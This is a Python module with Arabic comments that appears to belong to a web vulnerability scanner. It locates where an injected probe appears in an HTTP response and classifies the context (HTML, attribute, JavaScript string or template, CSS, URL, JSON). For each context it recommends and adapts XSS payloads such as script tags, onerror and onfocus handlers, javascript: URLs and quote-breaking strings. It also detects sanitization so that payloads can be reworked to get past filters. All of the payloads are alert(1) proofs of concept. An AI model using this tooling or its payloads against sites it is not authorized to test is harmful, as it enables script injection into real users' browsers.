
import re
from typing import Dict, List, Optional, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum

import logging

logger = logging.getLogger(__name__)


class ExecutionContext(Enum):
    """سياق تنفيذ XSS"""
    HTML = "html"
    HTML_ATTRIBUTE = "html_attribute"
    HTML_COMMENT = "html_comment"
    JAVASCRIPT_STRING = "javascript_string"
    JAVASCRIPT_TEMPLATE = "javascript_template"
    JAVASCRIPT_CODE = "javascript_code"
    CSS = "css"
    URL = "url"
    JSON = "json"
    XML = "xml"
    UNKNOWN = "unknown"


@dataclass
class ContextAnalysisResult:
    """نتيجة تحليل السياق"""
    context_type: ExecutionContext
    quote_character: Optional[str] = None  # ', ", `
    escape_character: Optional[str] = None  # \
    is_inside_tag: bool = False
    attribute_name: Optional[str] = None
    surrounding_text: str = ""
    confidence: float = 0.0
    recommendations: List[str] = field(default_factory=list)


class ContextAnalyzer:
    """
    محلل سياق XSS المتقدم
    
    الميزات:
    - كشف سياق التنفيذ (HTML, Attribute, JavaScript, CSS, URL)
    - كشف علامات الاقتباس والهروب
    - تحليل النص المحيط بنقطة الحقن
    - توصيات بحمولات مناسبة للسياق
    - دمج مع مولد الحمولات
    """
    
    # أنماط كشف السياق
    CONTEXT_PATTERNS = {
        ExecutionContext.HTML: [
            r'<[^>]*%s[^>]*>',
            r'>[^<]*%s[^<]*<',
        ],
        ExecutionContext.HTML_ATTRIBUTE: [
            r'=\s*["\']([^"\']*%s[^"\']*)["\']',
            r'=\s*([^\s>]*%s[^\s>]*)',
        ],
        ExecutionContext.HTML_COMMENT: [
            r'<!--[^-]*%s[^-]*-->',
        ],
        ExecutionContext.JAVASCRIPT_STRING: [
            r'["\']([^"\'\\]*(?:\\.[^"\'\\]*)*%s[^"\'\\]*)["\']',
        ],
        ExecutionContext.JAVASCRIPT_TEMPLATE: [
            r'`([^`]*%s[^`]*)`',
            r'\${([^}]*%s[^}]*)}',
        ],
        ExecutionContext.JAVASCRIPT_CODE: [
            r'<script[^>]*>.*?%s.*?</script>',
            r'\b(on\w+)=["\']([^"\']*%s[^"\']*)["\']',
        ],
        ExecutionContext.CSS: [
            r'<style[^>]*>.*?%s.*?</style>',
            r'style=["\']([^"\']*%s[^"\']*)["\']',
        ],
        ExecutionContext.URL: [
            r'href=["\']?[^"\']*%s',
            r'src=["\']?[^"\']*%s',
            r'url\([^)]*%s',
        ],
        ExecutionContext.JSON: [
            r'{"[^"]*":\s*"[^"]*%s[^"]*"}',
        ],
        ExecutionContext.XML: [
            r'<[^>]*%s[^>]*>',
        ],
    }
    
    def __init__(self):
        self._analysis_cache: Dict[str, ContextAnalysisResult] = {}
        
        logger.info("ContextAnalyzer initialized")
    
    async def analyze(
        self,
        response: str,
        injection_point: str,
        surrounding_radius: int = 100
    ) -> ContextAnalysisResult:
        """
        تحليل سياق نقطة الحقن
        
        Args:
            response: نص الاستجابة
            injection_point: نقطة الحقن (عادة ما تكون حمولة اختبار)
            surrounding_radius: نصف قطر النص المحيط
        
        Returns:
            نتيجة تحليل السياق
        """
        # البحث عن نقطة الحقن في الاستجابة
        index = response.find(injection_point)
        if index == -1:
            return ContextAnalysisResult(
                context_type=ExecutionContext.UNKNOWN,
                confidence=0.0
            )
        
        # استخراج النص المحيط
        start = max(0, index - surrounding_radius)
        end = min(len(response), index + len(injection_point) + surrounding_radius)
        surrounding = response[start:end]
        
        # تخزين مؤقت
        cache_key = f"{response[:100]}_{injection_point}"
        if cache_key in self._analysis_cache:
            return self._analysis_cache[cache_key]
        
        # تحليل السياق
        result = ContextAnalysisResult(
            context_type=ExecutionContext.UNKNOWN,
            surrounding_text=surrounding,
            confidence=0.0
        )
        
        # فحص كل نوع سياق
        for ctx_type, patterns in self.CONTEXT_PATTERNS.items():
            for pattern in patterns:
                pattern_filled = pattern.replace('%s', re.escape(injection_point))
                match = re.search(pattern_filled, surrounding, re.DOTALL | re.IGNORECASE)
                
                if match:
                    result.context_type = ctx_type
                    result.confidence = 0.8 if ctx_type != ExecutionContext.UNKNOWN else 0.3
                    
                    # استخراج علامات الاقتباس
                    quote_match = re.search(r'["\'`]', match.group(0))
                    if quote_match:
                        result.quote_character = quote_match.group(0)
                    
                    # استخراج اسم السمة (للسمات)
                    attr_match = re.search(r'(\w+)=', match.group(0))
                    if attr_match:
                        result.attribute_name = attr_match.group(1)
                    
                    # التحقق من وجود هروب
                    if '\\' in match.group(0):
                        result.escape_character = '\\'
                    
                    break
            
            if result.context_type != ExecutionContext.UNKNOWN:
                break
        
        # إضافة توصيات
        result.recommendations = self._get_recommendations(result)
        
        # تخزين في الذاكرة المؤقتة
        self._analysis_cache[cache_key] = result
        
        logger.debug(f"Context analysis: {result.context_type.value} (confidence={result.confidence})")
        
        return result
    
    def _get_recommendations(self, result: ContextAnalysisResult) -> List[str]:
        """الحصول على توصيات لحمولات مناسبة للسياق"""
        recommendations = []
        
        if result.context_type == ExecutionContext.HTML:
            recommendations.extend([
                "Use basic HTML tags: <script>alert(1)</script>",
                "Use HTML events: <img src=x onerror=alert(1)>",
                "Use SVG tags: <svg onload=alert(1)>"
            ])
        
        elif result.context_type == ExecutionContext.HTML_ATTRIBUTE:
            if result.quote_character:
                recommendations.append(f"Close attribute and inject: {result.quote_character}><script>alert(1)</script>")
                recommendations.append(f"Use event handler: {result.quote_character} autofocus onfocus=alert(1) {result.quote_character}")
            else:
                recommendations.append("Close attribute: ><script>alert(1)</script>")
                recommendations.append("Use event handler: autofocus onfocus=alert(1)")
        
        elif result.context_type == ExecutionContext.HTML_COMMENT:
            recommendations.append("Close comment: --><script>alert(1)</script>")
            recommendations.append("Use comment injection: --!><script>alert(1)</script>")
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_STRING:
            if result.quote_character:
                recommendations.append(f"Break string: {result.quote_character};alert(1);{result.quote_character}")
                recommendations.append(f"JavaScript injection: {result.quote_character}');alert(1);//")
            recommendations.append("Use template literal injection: ${alert(1)}")
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_TEMPLATE:
            recommendations.append("Template injection: ${alert(1)}")
            recommendations.append("Break template: ${alert(1)}//")
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_CODE:
            recommendations.append("Direct JavaScript injection: alert(1)")
            recommendations.append("Use eval: eval('alert(1)')")
        
        elif result.context_type == ExecutionContext.URL:
            recommendations.append("JavaScript protocol: javascript:alert(1)")
            recommendations.append("Use data protocol: data:text/html,<script>alert(1)</script>")
        
        elif result.context_type == ExecutionContext.CSS:
            recommendations.append("CSS expression: expression(alert(1))")
            recommendations.append("Background image: url('javascript:alert(1)')")
        
        elif result.context_type == ExecutionContext.JSON:
            recommendations.append("JSON XSS: \"</script><script>alert(1)</script>\"")
            recommendations.append("JSON injection: \"}alert(1);{\"")
        
        return recommendations
    
    async def get_best_payload_context(
        self,
        result: ContextAnalysisResult
    ) -> str:
        """
        الحصول على أفضل حمولة للسياق
        
        Args:
            result: نتيجة تحليل السياق
        
        Returns:
            قالب الحمولة المناسب
        """
        if result.context_type == ExecutionContext.HTML:
            return "<script>PAYLOAD</script>"
        
        elif result.context_type == ExecutionContext.HTML_ATTRIBUTE:
            if result.quote_character:
                return f'{result.quote_character}><script>PAYLOAD</script>'
            return '"><script>PAYLOAD</script>'
        
        elif result.context_type == ExecutionContext.HTML_COMMENT:
            return "--><script>PAYLOAD</script>"
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_STRING:
            if result.quote_character:
                return f'{result.quote_character};PAYLOAD;{result.quote_character}'
            return "';PAYLOAD;//"
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_TEMPLATE:
            return "${PAYLOAD}"
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_CODE:
            return "PAYLOAD"
        
        elif result.context_type == ExecutionContext.URL:
            return "javascript:PAYLOAD"
        
        elif result.context_type == ExecutionContext.CSS:
            return "expression(PAYLOAD)"
        
        return "PAYLOAD"
    
    async def adapt_payload(
        self,
        payload: str,
        result: ContextAnalysisResult
    ) -> str:
        """
        تكييف حمولة XSS حسب السياق
        
        Args:
            payload: الحمولة الأصلية
            result: نتيجة تحليل السياق
        
        Returns:
            حمولة مكيفة
        """
        # الحصول على قالب السياق
        template = await self.get_best_payload_context(result)
        
        # إدراج الحمولة في القالب
        adapted = template.replace("PAYLOAD", payload)
        
        # تعديلات إضافية حسب السياق
        if result.context_type == ExecutionContext.HTML_ATTRIBUTE:
            # إزالة علامات < و > من الحمولة إذا كانت في السمة
            if result.attribute_name in ["onload", "onerror", "onclick"]:
                adapted = adapted.replace("<script>", "").replace("</script>", "")
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_STRING:
            # هروب الأحرف الخاصة في JavaScript
            adapted = adapted.replace('\\', '\\\\').replace('"', '\\"').replace("'", "\\'")
        
        return adapted
    
    async def detect_sanitization(
        self,
        original_payload: str,
        response: str
    ) -> Dict[str, Any]:
        """
        اكتشاف تقنيات التنظيف (sanitization) المطبقة
        
        Args:
            original_payload: الحمولة الأصلية
            response: الاستجابة بعد الحقن
        
        Returns:
            معلومات عن التنظيف المطبق
        """
        sanitization = {
            "applied": False,
            "type": None,
            "evidence": None
        }
        
        # فحص إزالة العلامات
        if "<script>" in original_payload and "<script>" not in response:
            sanitization["applied"] = True
            sanitization["type"] = "tag_removal"
            sanitization["evidence"] = "Script tags removed"
        
        # فحص الهروب
        elif '"' in original_payload and '\\"' in response:
            sanitization["applied"] = True
            sanitization["type"] = "escaping"
            sanitization["evidence"] = "Quotes escaped"
        
        # فحص الترميز
        elif "<" in original_payload and "&lt;" in response:
            sanitization["applied"] = True
            sanitization["type"] = "html_encoding"
            sanitization["evidence"] = "HTML entities encoded"
        
        # فحص القطع
        elif len(original_payload) > 50 and response.find(original_payload) == -1:
            sanitization["applied"] = True
            sanitization["type"] = "truncation"
            sanitization["evidence"] = "Payload truncated"
        
        return sanitization
    
    async def get_context_break_payloads(
        self,
        result: ContextAnalysisResult
    ) -> List[str]:
        """
        الحصول على حمولات للخروج من السياق (context breaking)
        
        Args:
            result: نتيجة تحليل السياق
        
        Returns:
            قائمة حمولات للخروج من السياق
        """
        break_payloads = []
        
        if result.context_type == ExecutionContext.HTML_ATTRIBUTE:
            break_payloads.append(f'{result.quote_character or ""}><script>alert(1)</script>')
            break_payloads.append(f'{result.quote_character or ""} autofocus onfocus=alert(1) {result.quote_character or ""}')
            break_payloads.append('"><img src=x onerror=alert(1)>')
        
        elif result.context_type == ExecutionContext.JAVASCRIPT_STRING:
            break_payloads.append(f'{result.quote_character or "'"};alert(1);//')
            break_payloads.append(f'{result.quote_character or "'"});alert(1);//')
            break_payloads.append('${alert(1)}')
        
        elif result.context_type == ExecutionContext.HTML:
            break_payloads.append('</script><script>alert(1)</script>')
            break_payloads.append('><script>alert(1)</script>')
        
        return break_payloads
    
    async def clear_cache(self):
        """مسح ذاكرة التخزين المؤقت للتحليل"""
        self._analysis_cache.clear()
        logger.info("Context analyzer cache cleared")

